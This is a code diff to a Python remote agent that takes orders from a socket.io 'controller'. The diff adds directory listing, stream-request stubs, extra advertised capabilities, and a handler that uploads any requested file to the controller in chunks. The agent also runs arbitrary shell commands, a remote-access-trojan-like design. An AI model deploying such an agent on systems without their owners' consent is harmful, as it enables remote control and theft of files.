@@ -66,7 +66,7 @@ def execute_command(command):
         
         # Handle special commands that the original controller might send
         if command == 'start-stream' or command == 'start-screen-stream':
-            return "Screen streaming not available in pure agent (no privilege escalation required)"
+            return "Screen streaming not available in pure agent (requires screen capture libraries)"
         elif command == 'stop-stream':
             return "Screen streaming not active"
         elif command == 'start-camera-stream':
@@ -77,6 +77,30 @@ def execute_command(command):
             log("Shutdown requested by controller")
             sio.disconnect()
             sys.exit(0)
+        
+        # Handle file listing command
+        elif command.startswith('list-files ') or command == 'list-files':
+            try:
+                parts = command.split(' ', 1)
+                path = parts[1] if len(parts) > 1 else os.getcwd()
+                path_obj = Path(path)
+                
+                if not path_obj.exists():
+                    return f"Path not found: {path}"
+                
+                files = []
+                for item in path_obj.iterdir():
+                    try:
+                        stat = item.stat()
+                        size_str = f"{stat.st_size:,} bytes" if item.is_file() else "<DIR>"
+                        modified = datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
+                        files.append(f"{modified}  {size_str:>15}  {item.name}")
+                    except:
+                        files.append(f"                           <ERROR>  {item.name}")
+                
+                return f"Directory of {path_obj.absolute()}\n\n" + "\n".join(sorted(files))
+            except Exception as e:
+                return f"Error listing files: {str(e)}"
         
         # Determine if this is a PowerShell or CMD command
         powershell_indicators = [
@@ -238,7 +262,7 @@ def connect():
         'name': f'Pure-Agent-{AGENT_INFO["hostname"]}',
         'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
         'ip': 'Auto-detected',
-        'capabilities': ['commands', 'system_info'],
+        'capabilities': ['commands', 'files', 'system_info', 'process_management'],
         'cpu_usage': system_info.get('cpu_usage', 0),
         'memory_usage': system_info.get('memory_percent', 0),
         'network_usage': 0,
@@ -425,6 +449,41 @@ def on_shutdown(data):
     except Exception as e:
         log(f"Error during shutdown: {e}")
 
+@sio.on('start_stream')
+def on_start_stream(data):
+    """Handle start stream request from controller"""
+    try:
+        stream_type = data.get('type', '')
+        quality = data.get('quality', 'high')
+        
+        log(f"Stream request received: {stream_type} (quality: {quality})")
+        
+        # Inform that streaming is not available in pure agent
+        sio.emit('command_result', {
+            'agent_id': AGENT_ID,
+            'output': f'{stream_type.title()} streaming not available in pure agent (requires screen capture libraries)',
+            'success': False,
+            'timestamp': time.time()
+        })
+    except Exception as e:
+        log(f"Error handling start_stream: {e}")
+
+@sio.on('stop_stream')
+def on_stop_stream(data):
+    """Handle stop stream request from controller"""
+    try:
+        stream_type = data.get('type', '')
+        log(f"Stop stream request received: {stream_type}")
+        
+        sio.emit('command_result', {
+            'agent_id': AGENT_ID,
+            'output': f'{stream_type.title()} stream stopped',
+            'success': True,
+            'timestamp': time.time()
+        })
+    except Exception as e:
+        log(f"Error handling stop_stream: {e}")
+
 @sio.on('request_screenshot')
 def on_request_screenshot(data):
     """Handle screenshot request - not available in pure agent"""
@@ -551,26 +610,27 @@ def on_read_file(data):
     except Exception as e:
         log(f"Error reading file: {e}")
 
-@sio.on('download_file')
-def on_download_file(data):
-    """Download file (send in chunks)"""
+@sio.on('request_file_chunk_from_agent')
+def on_request_file_chunk(data):
+    """Handle file download request from controller"""
     try:
-        agent_id = data.get('agent_id', '')
-        if agent_id and agent_id != AGENT_ID:
-            return
+        filename = data.get('filename', '')
         
-        file_path = data.get('filename', '') or data.get('path', '')
+        log(f"File download requested: {filename}")
+        
         chunk_size = 64 * 1024  # 64KB chunks
         
         try:
-            path_obj = Path(file_path)
+            path_obj = Path(filename)
             if not path_obj.exists():
-                raise FileNotFoundError(f"File not found: {file_path}")
+                raise FileNotFoundError(f"File not found: {filename}")
             
             if not path_obj.is_file():
-                raise ValueError(f"Not a file: {file_path}")
+                raise ValueError(f"Not a file: {filename}")
             
             file_size = path_obj.stat().st_size
+            
+            log(f"Sending file: {filename} ({file_size} bytes)")
             
             with open(path_obj, 'rb') as f:
                 offset = 0
@@ -593,12 +653,13 @@ def on_download_file(data):
                     offset += len(chunk)
                     time.sleep(0.01)  # Small delay to avoid overwhelming
             
-            log(f"File download complete: {file_path} ({file_size} bytes)")
+            log(f"File download complete: {filename} ({file_size} bytes)")
             
         except Exception as e:
+            log(f"Error reading file: {e}")
             sio.emit('file_chunk_from_agent', {
                 'agent_id': AGENT_ID,
-                'filename': file_path,
+                'filename': filename,
                 'error': str(e)
             })
             
